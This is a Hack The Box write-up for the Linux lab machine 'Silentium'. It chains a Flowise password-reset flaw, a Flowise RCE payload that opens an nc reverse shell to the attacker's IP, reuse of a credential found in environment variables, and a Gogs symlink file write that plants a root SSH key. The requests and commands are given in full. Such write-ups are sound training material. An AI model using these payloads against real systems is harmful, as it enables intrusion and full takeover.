---
title: Silentium
layout: post
released: 2026-04-11
creators:
  - 7u9y
pwned: true
tags:
  - os/linux
  - diff/easy
category:
  - HTB
description: Silentium has a staging subdomain vulnerable to a CVE allowing us to reset the password of ben to gain access to Flowise. We're then able to exploit a CVE in Flowise's mcpServer configuration option to gain RCE as www-data. We're then able to pivot as ben by reusing his password that we can find in the env vars. Finally discovering Gogs service running as root on the machine we're able to exploit a CVE to conduct an arbitrary file write and write a root ssh key.
image: /assets/img/img_2026-09-12-silentium/0012.jpeg
cssclasses:
  - custom_htb
---
![](/assets/img/img_2026-09-12-silentium/0012.jpeg)
# Enumeration
## Scans
As usual we start off with an `nmap` port scan
```
PORT      STATE  SERVICE REASON         VERSION
22/tcp    open   ssh     syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBN9Ju3bTZsFozwXY1B2KIlEY4BA+RcNM57w4C5EjOw1QegUUyCJoO4TVOKfzy/9kd3WrPEj/FYKT2agja9/PM44=
|   256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH9qI0OvMyp03dAGXR0UPdxw7hjSwMR773Yb9Sne+7vD
80/tcp    open   http    syn-ack ttl 63 nginx 1.24.0 (Ubuntu)
|_http-favicon: Unknown favicon MD5: 033771DFEF9C64EFA01CAF726E3629A9
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Silentium | Institutional Capital & Lending Solutions
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

As usual with `Linux` machines on `HTB` we only find `2` ports open:
1. `22 - OpenSSH 9.6p1 on Ubuntu`
2. `80 - nginx 1.24.0`

## Silentium Webpage
Visiting the `nginx` website on `port 80` we're greated with a `Financial solutions` platform.
![[assets/img/img_2026-09-12-silentium/86247c3111836f42f2a428ac2ef50c83_MD5.png]]

Which is a mostly static site only running `javascript` for the `calculator` feature of the site. Notably however we can find several `names` that we may be able to use:
```
Marcus Throne
Ben
Elena Rossi
```

I've used `username-anarchy` to put these into a list of possible usernames.
```bash
$ cat usernames.txt
marcus
marcusthorne
marcus.thorne
marcusth
marcthor
marcust
m.thorne
mthorne
tmarcus
t.marcus
thornem
thorne
thorne.m
thorne.marcus
mt
ben
elena
elenarossi
elena.rossi
elenaros
elenross
elenar
e.rossi
erossi
relena
r.elena
rossie
rossi
rossi.e
rossi.elena
er
```
## Staging Subdomain
Running a quick `subdomain` scan we can find the `staging` domain pretty quickly.
```bash
$ ffuf -u "http://silentium.htb" -H "Host: FUZZ.silentium.htb" -w /usr/share/wordlists/seclists/Discovery/DNS/n0kovo_subdomains.txt -mc all -fc 301 -s
staging
```

Visiting the `staging` subdomain we're greated with a `Flowise AI` login page.
![[assets/img/img_2026-09-12-silentium/d3b92953326878853d858959d9ff15aa_MD5.png]]

# User
## Flowise Access
Searching around on the internet for `Flowise AI CVEs` we can come across a recent `CVE`: [CVE-2025-58434](https://nvd.nist.gov/vuln/detail/CVE-2025-58434) which exploits the `forgot-password` endpoint of `flowise 3.0.5` to create a `tempToken` which we can then use against the `reset-password` endpoint to reset the password.

I'll first create a `POST` request against the `forgot-password` endpoint with a non-existent email.
```http
POST /api/v1/account/forgot-password HTTP/1.1
Host: staging.silentium.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
x-request-from: internal
Content-Length: 42
Origin: http://staging.silentium.htb
Connection: keep-alive
Referer: http://staging.silentium.htb/forgot-password
Priority: u=0

{"user":{"email":"w1ld@0xw1ld.github.io"}}
```

I'll then use this with `FFUF` changing the `email` to `FUZZ@silentium.htb` so I can run through all the possible usernames that were generated
```bash
$ ffuf -request forgot-password.txt -request-proto http -w ./usernames.txt -mc all -fc 404,500 -s
ben
```

Looks like we got a hit on `ben`, let's take a look at the response of the `request`.
```http
HTTP/1.1 201 Created
Server: nginx/1.24.0 (Ubuntu)
Date: Mon, 13 Apr 2026 09:06:24 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 579
Connection: close
Access-Control-Allow-Origin: http://staging.silentium.htb
Vary: Origin
Access-Control-Allow-Credentials: true
ETag: W/"243-URl9UjZmeOjL8e5VXyumjOvoJCo"

{
    "user": {
        "id": "e26c9d6c-678c-4c10-9e36-01813e8fea73",
        "name": "admin",
        "email": "ben@silentium.htb",
        "credential": "$2a$05$dNN9sCyyu5NBe7WAWEcP6O63yoiRBLIVB/7QniqG/sSFEtFbXdf8i",
        "tempToken": "yzH9VbhjJVU5ygZS7XAalPCKi7v318SGeFJdp81D2tMkTZL1EKg4JqHLPSKgDOBX",
        "tokenExpiry": "2026-04-13T09:21:24.506Z",
        "status": "active",
        "createdDate": "2026-01-29T20:14:57.000Z",
        "updatedDate": "2026-04-13T09:06:24.000Z",
        "createdBy": "e26c9d6c-678c-4c10-9e36-01813e8fea73",
        "updatedBy": "e26c9d6c-678c-4c10-9e36-01813e8fea73"
    },
    "organization": {},
    "organizationUser": {},
    "workspace": {},
    "workspaceUser": {},
    "role": {}
}
```

We can then immediately use this `tempToken` to reset our password with the following request.
```http
POST /api/v1/account/reset-password HTTP/1.1
Host: staging.silentium.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
x-request-from: internal
Content-Length: 143
Origin: http://staging.silentium.htb
Connection: keep-alive
Referer: http://staging.silentium.htb/reset-password
Priority: u=0

{"user":{"email":"ben@silentium.htb","tempToken":"yzH9VbhjJVU5ygZS7XAalPCKi7v318SGeFJdp81D2tMkTZL1EKg4JqHLPSKgDOBX","password":"P@ssword123"}}
```

We're then able to login with the updated password.
![[assets/img/img_2026-09-12-silentium/6823b15533a30d7c44f7a190be4167e7_MD5.png]]

## Flowise RCE
We're now able to exploit another `CVE` we would have found during our searching [CVE-2025-59528](https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-3gcm-f6qx-ff7p) which allows us to execute arbitrary commands. So let's start a listener.
```bash
$ socat -dd TCP-LISTEN:9001,reuseaddr,fork -
2026/04/13 05:41:14 socat[63360] N listening on AF=2 0.0.0.0:9001
```

After which I sent the following request.
```http
POST /api/v1/node-load-method/customMCP HTTP/1.1
Host: staging.silentium.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
x-request-from: internal
Content-Length: 2328
Origin: http://staging.silentium.htb
Connection: keep-alive
Referer: http://staging.silentium.htb/canvas
Cookie: connect.sid=s%3AKaIvBAQA3T6kvLU20GGaXlr4Tv0iV9PA.E05h%2B9o3HgcRB0M8ZKN%2B%2Bb%2Bkre0PNNOudf2JtbwXSKw; token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6ImUyNmM5ZDZjLTY3OGMtNGMxMC05ZTM2LTAxODEzZThmZWE3MyIsInVzZXJuYW1lIjoiYWRtaW4iLCJtZXRhIjoiYWE0M2Q2ZjIyN2I1YzViZjUwMGJiYTRkNTBkMDU2MzM6ZjY4ZWM4NjNiZDNlMmJkMzgyMWJlNmEwMzRkNGE5ZjZkZGM4ZDc4ZTU2NGRhMjVhNDc0YmIyN2MwYTEzODcyZDU5M2FhOGIxNjE2OTQ2MWE0N2RhODFkMDM5NjVlMjllNTI0MjQyNDU2ODQyNzMzMzc1YjU1MDI0ZmNkYzBiYTkzMjI2Yjk5N2MyYzQyYTE2YTNiZGI3YWU2Zjg5OWZkOCIsImlhdCI6MTc3NjA3MTMwOSwibmJmIjoxNzc2MDcxMzA5LCJleHAiOjE3NzYwOTI5MDksImF1ZCI6IkFVRElFTkNFIiwiaXNzIjoiSVNTVUVSIn0.ASVOaYlhMDyiNlLW7JC0SqruDbEeynH6Si8W38vfwM8; refreshToken=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6ImUyNmM5ZDZjLTY3OGMtNGMxMC05ZTM2LTAxODEzZThmZWE3MyIsInVzZXJuYW1lIjoiYWRtaW4iLCJtZXRhIjoiNWNmNTk2YzcxZWFlOWE1MDdhYzVjZjg5NjJlMTE4Y2M6M2FlMjI2ZDc3MDU2NGI3ODMzM2M0MTYzMDcxOGU3MTE3NzQ0NTFjODY4ZTVlYzZiZWE4YTdlYWJhMmJkOWVjZDljMzUwMmI3Mjk1NzAzYzQwMjM1OGY2N2JhOTlmZjJkYWY0YzYwY2U3MTM2ZTE4NWUzZmRjYTdjZjQzODdhMGNlOTQ1YWI4Yzc2N2NlYjJhYzY0MmI3MmRkNmE0NmMyYiIsImlhdCI6MTc3NjA3MTMwOSwibmJmIjoxNzc2MDcxMzA5LCJleHAiOjE3Nzg2NjMzMDksImF1ZCI6IkFVRElFTkNFIiwiaXNzIjoiSVNTVUVSIn0.D8-jmoSG-778IM0iqMzRu7b_gutEBth8fNjszP-c_Cs
Priority: u=0

{
    "loadMethod": "listActions",
    "inputs": {
      "mcpServerConfig": "({x:(function(){const cp = process.mainModule.require(\"child_process\");cp.execSync(\"nc 10.10.14.31 9001 -e sh\");return 1;})()})"
    }
  }
```

Which resulted in a call back in my listener!
```bash
2026/04/13 05:41:25 socat[63360] N accepting connection from AF=2 10.129.250.34:37471 on AF=2 10.10.14.31:9001
2026/04/13 05:41:25 socat[63360] N forked off child process 63456
2026/04/13 05:41:25 socat[63360] N listening on AF=2 0.0.0.0:9001
2026/04/13 05:41:25 socat[63456] N reading from and writing to stdio
2026/04/13 05:41:25 socat[63456] N starting data transfer loop with FDs [6,6] and [0,1]
whoami
root
```

## Ben Password Reuse
Taking a look around we find we're in a docker container with the presence of `.dockerenv`
```bash
ls -lash 
total 68K    
   4.0K drwxr-xr-x    1 root     root        4.0K Apr 13 09:40 .
   4.0K drwxr-xr-x    1 root     root        4.0K Apr 13 09:40 ..
      0 -rwxr-xr-x    1 root     root           0 Apr  8 15:14 .dockerenv
   4.0K drwxr-xr-x    1 root     root        4.0K Jul 16  2025 bin
      0 drwxr-xr-x    5 root     root         340 Apr 13 08:24 dev
   4.0K drwxr-xr-x    1 root     root        4.0K Apr  8 15:14 etc
   4.0K drwxr-xr-x    1 root     root        4.0K Jul 16  2025 home
   4.0K drwxr-xr-x    1 root     root        4.0K Jul 15  2025 lib
   4.0K drwxr-xr-x    5 root     root        4.0K Jul 15  2025 media
   4.0K drwxr-xr-x    2 root     root        4.0K Jul 15  2025 mnt
   4.0K drwxr-xr-x    1 root     root        4.0K Jul 16  2025 opt
      0 dr-xr-xr-x  286 root     root           0 Apr 13 08:24 proc
   4.0K drwx------    1 root     root        4.0K Apr  8 09:41 root
   4.0K drwxr-xr-x    3 root     root        4.0K Jul 15  2025 run
   4.0K drwxr-xr-x    2 root     root        4.0K Jul 15  2025 sbin
   4.0K drwxr-xr-x    2 root     root        4.0K Jul 15  2025 srv
      0 dr-xr-xr-x   13 root     root           0 Apr 13 08:24 sys
   4.0K drwxrwxrwt    1 root     root        4.0K Apr 13 09:41 tmp
   8.0K drwxr-xr-x    1 root     root        4.0K Apr  8 09:41 usr
   4.0K drwxr-xr-x    1 root     root        4.0K Jul 15  2025 var
```

Looking at our `env` we can find several `clear text credentials`
```bash
env       
FLOWISE_PASSWORD=F1l3_d0ck3r
ALLOW_UNAUTHORIZED_CERTS=true
NODE_VERSION=20.19.4
HOSTNAME=c78c3cceb7ba
YARN_VERSION=1.22.22
SMTP_PORT=1025
SHLVL=3
PORT=3000
HOME=/root
SENDER_EMAIL=ben@silentium.htb
PUPPETEER_EXECUTABLE_PATH=/usr/bin/chromium-browser
JWT_ISSUER=ISSUER
JWT_AUTH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD
LLM_PROVIDER=nvidia-nim
SMTP_USERNAME=test
SMTP_SECURE=false
JWT_REFRESH_TOKEN_EXPIRY_IN_MINUTES=43200
FLOWISE_USERNAME=ben
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
DATABASE_PATH=/root/.flowise
JWT_TOKEN_EXPIRY_IN_MINUTES=360
JWT_AUDIENCE=AUDIENCE
SECRETKEY_PATH=/root/.flowise
PWD=/
SMTP_PASSWORD=[REDACTED]
NVIDIA_NIM_LLM_MODE=managed
SMTP_HOST=mailhog
JWT_REFRESH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD
SMTP_USER=test
```

reusing the `SMTP_PASSWORD` we're able to `SSH` onto the machine as `ben`
```bash
$ ssh ben@silentium.htb                                                                                     
The authenticity of host 'silentium.htb (10.129.250.34)' can't be established.
ED25519 key fingerprint is: SHA256:OZNUeTZ9jastNKKQ1tFXatbeOZzSFg5Dt7nhwhjorR0
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'silentium.htb' (ED25519) to the list of known hosts.
ben@silentium.htb's password: 
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-107-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Mon Apr 13 09:45:18 AM UTC 2026

  System load:           0.0
  Usage of /:            82.9% of 13.37GB
  Memory usage:          19%
  Swap usage:            0%
  Processes:             231
  Users logged in:       0
  IPv4 address for eth0: 10.129.250.34
  IPv6 address for eth0: dead:beef::250:56ff:fe95:b129

  => There are 4 zombie processes.


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

1 additional security update can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm

Last login: Wed Apr  8 19:12:55 2026 from 10.10.14.5
ben@silentium:~$ ls -lash
total 28K
4.0K drwxr-x--- 3 ben  ben  4.0K Apr  8 19:53 .
4.0K drwxr-xr-x 3 root root 4.0K Apr  8 09:41 ..
   0 -rw------- 1 ben  ben     0 Apr  8 19:53 .bash_history
4.0K -rw-r--r-- 1 ben  ben   220 Jan 29 13:53 .bash_logout
4.0K -rw-r--r-- 1 ben  ben  3.7K Jan 29 13:53 .bashrc
4.0K drwx------ 2 ben  ben  4.0K Apr  8 09:41 .cache
4.0K -rw-r--r-- 1 ben  ben   807 Jan 29 13:53 .profile
4.0K -rw-r----- 1 root ben    33 Apr 13 08:25 user.txt

```

Just like that, we have User!
# Root
## Finding Local Services
Taking a look around we can find several ports listening
```bash
ben@silentium:~$ netstat -tlnp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:43667         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3001          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.54:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8025          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:1025          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -
```

Doing some recon with `curl` and `nc` I've identified the most interesting one to be port `3001`. Which after forwarding to our local port we're greeted by a `Gogs` git service.
![[assets/img/img_2026-09-12-silentium/8266d00ed73edecb03d0917b7df19572_MD5.png]]

As well as port `8025` which is `MailHog`
![[assets/img/img_2026-09-12-silentium/c2bfde523ea876f56bc1142f7b09939e_MD5.png]]

We're unable to login or reset `ben`'s password on `Gogs`, however we are able to register and login.
![[assets/img/img_2026-09-12-silentium/64496abeebc053ef5af890dc4b6f4c59_MD5.png]]

## GOGS arbitrary file write to Root Shell
Taking a look around we can find another `CVE`: [CVE-2024-55947](https://github.com/gogs/gogs/security/advisories/GHSA-qf5v-rp47-55gg) which was patched but had a new update in [CVE-2025-8110](https://nvd.nist.gov/vuln/detail/CVE-2025-8110). So let's setup and initialize a repository and clone it.
```bash
http://staging-v2-code.dev.silentium.htb:3001/w1ld/w1ld.git
```

Next let's grab an `API token` from `/user/settings/applications`.
```
922eb1f7e0487578b537f6c00baad5de95a4d3a8
```

Let's create the symlink, add the file, and push the changes.
```bash
ben@silentium:/tmp/w1ld$ ln -s /root/.ssh/authorized_keys keys
ben@silentium:/tmp/w1ld$ git add *
ben@silentium:/tmp/w1ld$ git commit -am '[w1ld] add keys'
[master 160ae1b] [w1ld] add keys
 1 file changed, 1 insertion(+), 1 deletion(-)
ben@silentium:/tmp/w1ld$ git push
Enumerating objects: 5, done.
Counting objects: 100% (5/5), done.
Delta compression using up to 2 threads
Compressing objects: 100% (2/2), done.
Writing objects: 100% (3/3), 302 bytes | 302.00 KiB/s, done.
Total 3 (delta 0), reused 0 (delta 0), pack-reused 0
Username for 'http://localhost:3001': w1ld
Password for 'http://w1ld@localhost:3001': 
To http://localhost:3001/w1ld/w1ld.git
   b660a00..160ae1b  master -> master
```

Finally let's send the request with the `base64` of our `public ssh key`
```http
PUT /api/v1/repos/w1ld/w1ld/contents/keys HTTP/1.1
Host: 127.0.0.1:3001
Content-Type: application/json
Authorization: token 922eb1f7e0487578b537f6c00baad5de95a4d3a8

{"message":"test","content":"c3NoLWVkMjU1MTkgQUFBQUMzTnphQzFsWkRJMU5URTVBQUFBSUxCREJWcllobEpmdE9HaEpzSGZSeDNBSXBHQWs0MnB0SUV1b2pERzlYMTUga2FsaUBrYWxpCg=="}
```

We should now be able to `ssh` onto `silentium` as root.
```bash
$ ssh root@silentium.htb                                                                                    
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-107-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Mon Apr 13 10:36:51 AM UTC 2026

  System load:           0.05
  Usage of /:            82.9% of 13.37GB
  Memory usage:          20%
  Swap usage:            0%
  Processes:             235
  Users logged in:       1
  IPv4 address for eth0: 10.129.250.34
  IPv6 address for eth0: dead:beef::250:56ff:fe95:b129

  => There are 4 zombie processes.


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

1 additional security update can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

root@silentium:~#
```

Just like that, we have Root!